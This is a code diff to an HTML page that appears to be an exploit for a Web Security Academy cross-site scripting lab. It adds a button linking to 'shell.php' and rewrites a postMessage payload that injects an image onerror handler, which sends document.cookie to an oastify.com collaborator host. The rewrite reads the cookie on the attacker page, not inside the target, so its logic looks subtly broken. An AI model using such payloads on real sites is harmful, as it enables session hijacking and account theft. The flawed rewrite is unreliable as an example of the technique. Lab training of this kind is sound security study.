@@ -41,6 +41,9 @@
 <main>
     <p>This is a simple HTML page.</p>
     <button onclick="showMessage()">Click Me</button>
+    <button onclick="window.location.href='shell.php'">
+        Open PHP File
+    </button>
 </main>
 
 <script>
@@ -52,10 +55,12 @@
 <!-- Your evil.com page -->
 <iframe id="t" src="https://0a4600af0377549a80f2bc620069009b.web-security-academy.net" onload="go()"></iframe>
 <script>
-  function go() {
-    document.getElementById('t').contentWindow
-      .postMessage('<img src=x onerror=fetch('https://ujhy0grnsfxu9c3cbner49wjfal19sxh.oastify.com?c'=+document.cookie)>', '*');
-  }
+    function go() {
+        // build the payload string safely to avoid quote conflicts
+        var url = 'https://ujhy0grnsfxu9c3cbner49wjfal19sxh.oastify.com?c=' + document.cookie;
+        var msg = '<img src="x" onerror="fetch(\'' + url + '\')">';
+        document.getElementById('t').contentWindow.postMessage(msg, '*');
+    }
 </script>
 
 </body>
